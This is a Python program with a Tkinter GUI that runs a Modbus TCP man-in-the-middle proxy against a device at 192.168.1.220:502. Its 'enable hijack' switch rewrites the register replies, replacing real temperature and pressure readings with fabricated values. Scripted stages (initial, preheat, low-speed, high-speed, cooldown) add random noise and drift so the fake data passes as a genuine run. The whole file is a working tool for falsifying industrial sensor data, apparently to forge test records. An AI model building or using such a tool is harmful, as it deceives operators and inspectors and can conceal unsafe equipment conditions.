import random
import socket
import struct
import threading
import sys
import tkinter as tk
from tkinter import ttk, messagebox
import configparser
import os

# ===== 配置文件 =====
CONFIG_FILE = "config.ini"
default_config = {
    "NETWORK": {
        "REMOTE_HOST": "192.168.1.220",
        "REMOTE_PORT": "502",
        "LOCAL_HOST": "0.0.0.0",
        "LOCAL_PORT": "5502",
        "BUFFER_SIZE": "4096"
    },
    "REGISTERS": {
        "name":"温度,压力,传感器3,传感器4,传感器5,传感器6,传感器7,传感器8",
        "min_values": "0,0,0,0,0,0,0,0",
        "max_values": "1600,4000,100,100,100,100,100,100",
        "units": "℃,kpa,aa,aa,aa,aa,aa,aa"
    }
}

config = configparser.ConfigParser()
if not os.path.exists(CONFIG_FILE):
    for section, values in default_config.items():
        config[section] = values
    with open(CONFIG_FILE, "w") as f:
        config.write(f)
else:
    config.read(CONFIG_FILE)

REMOTE_HOST = config["NETWORK"].get("REMOTE_HOST", "0.0.0.0")
REMOTE_PORT = int(config["NETWORK"].get("REMOTE_PORT", 0))
LOCAL_HOST = config["NETWORK"].get("LOCAL_HOST", "0.0.0.0")
LOCAL_PORT = int(config["NETWORK"].get("LOCAL_PORT", 0))
BUFFER_SIZE = int(config["NETWORK"].get("BUFFER_SIZE", 0))

name = config["REGISTERS"].get("name", "a,a,a,a,a,a,a,a").split(",")
min_values = [float(x) for x in config["REGISTERS"].get("min_values", "0,0,0,0,0,0,0,0").split(",")]
max_values = [float(x) for x in config["REGISTERS"].get("max_values", "1,1,1,1,1,1,1,1").split(",")]
units = config["REGISTERS"].get("units", "a,a,a,a,a,a,a,a").split(",")

# ===== 数据 =====
real_dat = [0] * 8      # 修改前的真实数据
out_dat = [0] * 8       # 修改后的输出数据
set_values = [0] * 8    # 设置初始值
set_random = [0] * 8    # 设置随机幅度值
set_add = [0] * 8       # 设置每次读取后累加步长
set_mult = [1] * 8      # 设置倍率（独立乘区）
enable_set = False      # 启用所有设置
state_text=["常规","初始0","预热1","低速2","高速3","降温4"]
state=0
add_flag_1=False
add_flag_2=True
# # ===== HEX / ASCII 打印 =====
# def hexdump(data: bytes) -> str:
#     return " ".join(f"{b:02X}" for b in data)


# def ascii_dump(data: bytes) -> str:
#     return "".join(chr(b) if 0x20 <= b <= 0x7E else "." for b in data)


# ===== 数据转发 =====
def forward(src, dst, direction):
    global real_dat, out_dat, set_values,set_mult,add_flag_1,add_flag_2
    try:
        while True:
            data = src.recv(BUFFER_SIZE)
            if not data:
                break
            mutable = bytearray(data)
            # 替换 IP
            if len(mutable) >= 15 and mutable[7:11] == b'\x14\x1c\x1b\x06':
                mutable[11:15] = socket.inet_aton(dst.getsockname()[0])
            # 修改寄存器
            elif len(mutable) == 27 and enable_set:
                raw = mutable[11:27]
                values = struct.unpack("!8H", raw)
                generated = []

                # 根据状态调整值
                if state !=0:
                    if state ==1:   # 初始阶段
                        # 设置温度
                        set_values[0]=605
                        set_random[0]=3
                        # 设置压力
                        set_values[1]=3045
                        set_random[1]=8

                    elif state ==2: # 预热阶段
                        # 设置温度
                        if out_dat[0]<600:
                            set_add[0]=random.uniform(1,4)
                        elif out_dat[0]<650:
                            set_add[0]=random.uniform(0,2)
                        else:
                            set_add[0]=random.uniform(-2,1)

                        # 设置压力
                        set_random[1]=6
                        if add_flag_1:
                            set_add[1] = random.uniform(46, 60)
                            if out_dat[1] > 3200:
                                add_flag_1 = False
                        else:
                            set_add[1] = random.uniform(-8,4)
                            if out_dat[1] < 2700:
                                add_flag_1 = True
                            elif out_dat[1] > 3200:
                                set_add[1] = random.uniform(-30, -10)


                    elif state ==3: # 低速阶段
                        # 设置温度
                        if out_dat[0]<650:
                            set_add[0]=random.uniform(4,8)
                            set_random[0]=5
                        elif out_dat[0]<750:
                            set_add[0]=random.uniform(0,1)
                        elif out_dat[0]<850:
                            set_add[0]=random.uniform(0,1.6)
                            set_random[0]=8
                        elif out_dat[0]<950:
                            set_add[0]=random.uniform(0,2.4)
                        elif out_dat[0]<1050:
                            set_add[0]=random.uniform(0,3)
                        elif out_dat[0]<1400:
                            set_add[0]=random.uniform(0,4)
                        else:
                            set_add[0]=random.uniform(-5,1)

                        # 设置压力
                        set_random[1]=6
                        if add_flag_1:
                            set_add[1] = random.uniform(46, 60)
                            if out_dat[1] > 3200:
                                add_flag_1 = False
                        else:
                            set_add[1] = random.uniform(-8,4)
                            if out_dat[1] < 2700:
                                add_flag_1 = True
                            elif out_dat[1] > 3200:
                                set_add[1] = random.uniform(-30, -10)


                    elif state ==4: # 高速阶段
                        # 设置温度
                        set_random[0]=8
                        if add_flag_2:
                            set_add[0] = random.uniform(-3, 1)
                            if out_dat[0] < 1400:
                                set_add[0] = random.uniform(2,6)
                            else:
                                set_add[0] = random.uniform(0, 1.6)
                            if out_dat[0] > 1480:
                                add_flag_2 = False
                        else:
                            set_add[0] = random.uniform(-0.8, 0)

                        # 设置压力
                        set_random[1]=6
                        if add_flag_1:
                            set_add[1] = random.uniform(46, 60)
                            if out_dat[1] >= 4000:
                                add_flag_1 = False
                        else:
                            set_add[1] = random.uniform(-8,4)
                            if out_dat[1] < 3800:
                                add_flag_1 = True
                            elif out_dat[1] > 4050:
                                set_add[1] = random.uniform(-30, -10)


                    elif state ==5: # 降温阶段
                        set_add[0]=-1.5*(out_dat[0]-25)/1000
                        set_random[0]=5
                        set_add[1]=-120*(out_dat[1]/max_values[1])
                        set_random[1]=4


                for i in range(8):
                    real_dat[i] = values[i] / 65536 * (max_values[i] - min_values[i]) + min_values[i]

                    if enable_vars[i].get():
                        rnd = random.random() * set_random[i]
                        val = set_values[i] + rnd
                        val_int = int((val - min_values[i]) / (max_values[i] - min_values[i]) * 65535*set_mult[i])
                        val_int = max(0, min(65535, val_int))
                        out_dat[i] = val_int / 65535 * (max_values[i] - min_values[i]) + min_values[i]
                        if set_add[i] != 0:
                            set_values[i] += set_add[i]
                    else:
                        val_int=values[i]

                    generated.append(val_int)
                avg_val = int(sum(generated) / len(generated))
                mutable[9:27] = struct.pack("!9H", avg_val, *generated)
            dst.sendall(bytes(mutable))
    except Exception as e:
        print(f"[!] 转发异常 {direction}: {e}")
    finally:
        try:
            src.shutdown(socket.SHUT_RDWR)
        except:
            pass
        try:
            dst.shutdown(socket.SHUT_RDWR)
        except:
            pass
        src.close()
        dst.close()


# ===== 客户端处理 =====
def handle_client(local_conn, local_addr):
    try:
        remote_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_conn.connect((REMOTE_HOST, REMOTE_PORT))
    except:
        local_conn.close()
        return
    threading.Thread(target=forward, args=(local_conn, remote_conn, "TX"), daemon=True).start()
    threading.Thread(target=forward, args=(remote_conn, local_conn, "RX"), daemon=True).start()


# ===== 服务器线程 =====
def server_thread():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LOCAL_HOST, LOCAL_PORT))
    server.listen(50)
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


threading.Thread(target=server_thread, daemon=True).start()

# ===== GUI =====
root = tk.Tk()
root.title("寄存器控制与显示")
root.geometry("540x400")
root.resizable(False, False)

frame = ttk.Frame(root)
frame.grid(row=1, column=0, columnspan=6, padx=10, pady=10)

tk.Label(frame, text="寄存器").grid(row=0, column=0)
tk.Label(frame, text="值").grid(row=0, column=1)
tk.Label(frame, text="随机幅度").grid(row=0, column=2)
tk.Label(frame, text="累加步长").grid(row=0, column=3)
tk.Label(frame, text="倍率").grid(row=0, column=4)
tk.Label(frame, text="实际值").grid(row=0, column=5)
tk.Label(frame, text="输出值").grid(row=0, column=6)
tk.Label(frame, text="启用通道").grid(row=0, column=7)

value_entries = []
random_entries = []
add_entries = []
mult_entries = []
real_labels = []
out_labels = []
enable_vars = []
state_label=[]
enable_var = tk.BooleanVar(value=enable_set)

for i in range(8):
    # 寄存器编号
    tk.Label(frame, text=name[i ]).grid(row=i + 1, column=0, padx=5, pady=2)

    # 设定值
    ve = tk.Entry(frame, width=8)
    ve.grid(row=i + 1, column=1)
    ve.insert(0, str(set_values[i]))
    value_entries.append(ve)

    # 随机增幅
    re = tk.Entry(frame, width=8)
    re.grid(row=i + 1, column=2)
    re.insert(0, str(set_random[i]))
    random_entries.append(re)

    # 累加步长
    ae = tk.Entry(frame, width=8)
    ae.grid(row=i + 1, column=3)
    ae.insert(0, str(set_add[i]))
    add_entries.append(ae)

    # 倍率
    me = tk.Entry(frame, width=8)
    me.grid(row=i + 1, column=4)
    me.insert(0, str(set_mult[i]))
    mult_entries.append(me)

    # 实际输入值
    rl = tk.Label(frame, text="0.00", foreground="blue")
    rl.grid(row=i + 1, column=5)
    real_labels.append(rl)

    # 修正后输出值
    ol = tk.Label(frame, text="0.00", foreground="green")
    ol.grid(row=i + 1, column=6)
    out_labels.append(ol)

    # 是否启用
    var = tk.BooleanVar(value=False)
    ttk.Checkbutton(frame, variable=var).grid(row=i + 1, column=7, padx=5, pady=5)
    enable_vars.append(var)


ttk.Checkbutton(root, text="启用劫持", width=8, variable=enable_var,
                command=lambda: setattr(sys.modules[__name__], 'enable_set', enable_var.get())).grid(row=10, column=0,
                                                                                                     padx=3, pady=5)
ttk.Button(root, text="更新值", width=8, command=lambda: [update_entries(value_entries, set_values)]).grid(row=10,
                                                                                                        column=1,
                                                                                                        pady=5)
ttk.Button(root, text="更新随机", width=8, command=lambda: [update_entries(random_entries, set_random)]).grid(row=10,
                                                                                                          column=2,
                                                                                                          pady=5)
ttk.Button(root, text="更新累加", width=8, command=lambda: [update_entries(add_entries, set_add)]).grid(row=10, column=3,
                                                                                                    pady=5)
ttk.Button(root, text="更新倍率", width=8, command=lambda: [update_entries(mult_entries, set_mult)]).grid(row=10, column=4,
                                                                                                    pady=5)
st=tk.Label(root, text="当前:常规", width=8)
st.grid(row=10, column=5)
state_label.append(st)

ttk.Button(root, text="常规状态", width=8, command=lambda: [change_state(0)]).grid(row=11, column=0, pady=5)
ttk.Button(root, text="jky初始0", width=8, command=lambda: [change_state(1)]).grid(row=11, column=1, pady=5)
ttk.Button(root, text="jky预热1", width=8, command=lambda: [change_state(2)]).grid(row=11, column=2, pady=5)
ttk.Button(root, text="jky低速2", width=8, command=lambda: [change_state(3)]).grid(row=11, column=3, pady=5)
ttk.Button(root, text="jky高速3", width=8, command=lambda: [change_state(4)]).grid(row=11, column=4, pady=5)
ttk.Button(root, text="jky降温4", width=8, command=lambda: [change_state(5)]).grid(row=11, column=5, pady=5)



def update_entries(entries_list, target_list):
    try:
        for i, e in enumerate(entries_list):
            target_list[i] = float(e.get())
    except:
        messagebox.showerror("错误", "请输入数字")

def change_state(new_state):
    global state
    if 0<=new_state<=5:
        state = new_state
    # 更新状态显示
    if state_label and state_label[0]:
        state_label[0].config(text=f"当前:{state_text[state]}")

def update_display():
    for i in range(8):
        real_labels[i].config(text=f"{real_dat[i]:.2f} {units[i]}")
        out_labels[i].config(text=f"{out_dat[i]:.2f} {units[i]}")
    	# state_label[0].config(text=f"当前状态：{state_text[state]}")
        if state != 0:
        # 更新值输入框
            value_entries[i].delete(0, tk.END)
            value_entries[i].insert(0, f"{set_values[i]:.2f}")
            
            # 更新随机增幅输入框
            random_entries[i].delete(0, tk.END)
            random_entries[i].insert(0, f"{set_random[i]:.2f}")
            
            # 更新累加步长输入框
            add_entries[i].delete(0, tk.END)
            add_entries[i].insert(0, f"{set_add[i]:.2f}")
            
            # 更新倍率输入框
            mult_entries[i].delete(0, tk.END)
            mult_entries[i].insert(0, f"{set_mult[i]:.2f}")
    root.after(500, update_display)


update_display()
root.mainloop()
